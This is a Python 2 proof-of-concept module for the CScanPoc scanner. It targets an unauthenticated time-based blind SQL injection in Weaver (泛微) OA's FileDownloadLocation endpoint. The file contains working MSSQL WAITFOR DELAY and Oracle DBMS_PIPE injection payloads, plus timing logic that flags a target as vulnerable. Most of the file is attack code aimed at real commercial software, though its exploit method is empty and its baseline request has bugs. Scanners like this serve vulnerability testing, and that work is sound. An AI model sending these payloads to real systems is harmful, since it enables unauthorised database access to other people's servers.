# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'weaver_0009' # 平台漏洞编号，留空
    name = '泛微某系统通用型SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-17'  # 漏洞公布时间
    desc = '''
       泛微某系统通用型SQL注入,无需登录直接注入...全版本通杀... 
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=076418
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0e826e26-64f9-4eaa-8b77-d06e8f5dd03f'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            true_url='/weaver/weaver.email.FileDownloadLocation?fileid=32&download=1'
            start_time=time.time()
            code, head, res, errcode, _ = hh.http(true_url)
            end_time=time.time()
            true_time=end_time-start_time
            payloads = [
                '/weaver/weaver.email.FileDownloadLocation?fileid=32%20WAITFOR%20DELAY%20\'0:0:5\'&download=1', #mssql
                '/weaver/weaver.email.FileDownloadLocation?fileid=32%20AND%209285=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(83)||CHR(81)||CHR(70),5)&download=1' #oracle
            ]

            for payload in payloads:
                flase_url = '{target}'.format(target=self.target)+payload
                start_time1 = time.time()
                code1, head1, res1, errcode1, _ = hh.http(flase_url)
                end_time1=time.time()
                flase_time=end_time1-start_time1
                       
                if code == 200 and  flase_time>true_time and flase_time >5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()